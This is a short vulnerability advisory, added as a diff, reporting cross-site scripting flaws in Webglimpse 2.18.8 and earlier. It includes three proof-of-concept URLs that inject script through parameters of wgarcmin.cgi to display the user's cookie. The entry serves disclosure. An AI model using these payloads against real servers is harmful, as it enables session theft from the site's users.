@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/52170/info
+
+Webglimpse is prone to multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied data.
+
+Exploiting these issues could allow an attacker to execute arbitrary script on the affected server and steal cookie-based authentication credentials. Other attacks are also possible.
+
+Webglimpse versions 2.18.8 and prior are affected. 
+
+http://www.example.com/wgarcmin.cgi?URL2FIL=URL+2+File+--%3E&URL=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E&NEXTPAGE=T
+
+http://www.example.com/wgarcmin.cgi?FIL2URL=%3C--+File+2+URL&FILE=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E&NEXTPAGE=T
+
+http://www.example.com/wgarcmin.cgi?DOMAIN=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E&NEXTPAGE=T 
